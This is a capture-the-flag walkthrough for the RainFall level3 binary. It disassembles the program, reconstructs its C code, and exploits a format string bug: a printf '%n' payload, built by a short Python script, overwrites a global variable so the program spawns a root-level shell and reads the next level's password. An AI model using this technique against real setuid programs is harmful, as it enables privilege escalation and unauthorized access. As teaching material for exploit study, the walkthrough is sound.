# Walkthrough

##	Program type:
Running the command `file ./level3` we see the file is 32-bit ELF executable.
```
level3@RainFall:~$ file ./level3
./level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
```
Running the command `checksec --file ./level3, we see that the stack is
executable (NX disabled).
```
level3@RainFall:~$ checksec --file ./level3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level3
```
##	Content:
```
080484a4 <v>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	81 ec 18 02 00 00    	sub    esp,0x218
 80484ad:	a1 60 98 04 08       	mov    eax,ds:0x8049860
 80484b2:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484b6:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 80484bd:	00
 80484be:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484c4:	89 04 24             	mov    DWORD PTR [esp],eax
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
 80484da:	a1 8c 98 04 08       	mov    eax,ds:0x804988c
 80484df:	83 f8 40             	cmp    eax,0x40
 80484e2:	75 34                	jne    8048518 <v+0x74>
 80484e4:	a1 80 98 04 08       	mov    eax,ds:0x8049880
 80484e9:	89 c2                	mov    edx,eax
 80484eb:	b8 00 86 04 08       	mov    eax,0x8048600
 80484f0:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 80484f4:	c7 44 24 08 0c 00 00 	mov    DWORD PTR [esp+0x8],0xc
 80484fb:	00
 80484fc:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048503:	00
 8048504:	89 04 24             	mov    DWORD PTR [esp],eax
 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
 804850c:	c7 04 24 0d 86 04 08 	mov    DWORD PTR [esp],0x804860d
 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
 8048518:	c9                   	leave
 8048519:	c3                   	ret

0804851a <main>:
 804851a:	55                   	push   ebp
 804851b:	89 e5                	mov    ebp,esp
 804851d:	83 e4 f0             	and    esp,0xfffffff0
 8048520:	e8 7f ff ff ff       	call   80484a4 <v>
 8048525:	c9                   	leave
 8048526:	c3                   	ret
 8048527:	90                   	nop
 8048528:	90                   	nop
 8048529:	90                   	nop
 804852a:	90                   	nop
 804852b:	90                   	nop
 804852c:	90                   	nop
 804852d:	90                   	nop
 804852e:	90                   	nop
 804852f:	90                   	nop
```
* The `main` function calls `v` function.

* `fgets(3)` is called inside `v`, which is a more secured version of `gets(3)`.
Allowing to specify a number of bytes to be read, eliminating any 
possibility to do a buffer overflow (by eliminating we mean the bytes to
be read should not be more than the size of the buffer itself, otherwise 
you are stupid, I mean the programmer).
* The buffer is passed directly as first argument to `printf(1)`, which allows
to utilize a format string vulnerability.

* There's an if condition comparing the value `0x40` (64 in decimal) with a 
certain variable (global variable).

* If they are equal, `fwrite(3)` writes the string `"Wait what?!"` and calls
`system(3)` with `"/bin/sh"` afterwards.

* There's no way to change the value of the global variable to match the 
compared value directly.

## Reversing:
Upon analyzing the disassembly code we concluded that the actual C code could be something as follows:

```C
#include <stdio.h>

int		some_variable = 0;

void	v()
{
	char	buffer[520]; // 0x208

	fgets(buffer, 512, stdin); // 0x200
	printf(buffer);
	if (some_variable == 64)
	{
		fwrite("Wait what?!", 1, 12, stdout);
		system("/bin/sh");
	}
}

int		main()
{
	v();
	return (0);
}

```
## Solution:

* The idea is to use printf(1) to put 0x40 (64 in decimal) in the global variable:
	* We need to find its address on the data segment, we can find it in the 
	disassembly of the 'v' function:
	```
	0x080484da <+54>:	mov    eax , ds:0x804988c <-- (Simple ;p)
	```
	* We will use the format string specifier %n to modify its value as follows:
	```
	"%60x%4$n"
	```
	The `"%60x"` part writes a padding of 60 bytes in the stdout, and `"%4$n"`
	counts those written bytes and writes in the target address (the 4th 
	address in the stack frame).
* Now lets write the python script that will enable us to access the shell using that vulnerability:

```python
import struct

system_addr = struct.pack('I', 0x804988c)

print system_addr + "%60x%4$n"
```
* Running the exploit give us access to an unauthorized shell:
```
level3@RainFall:~$ (python exp.py; cat -) | ./level3
�                                                         200
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
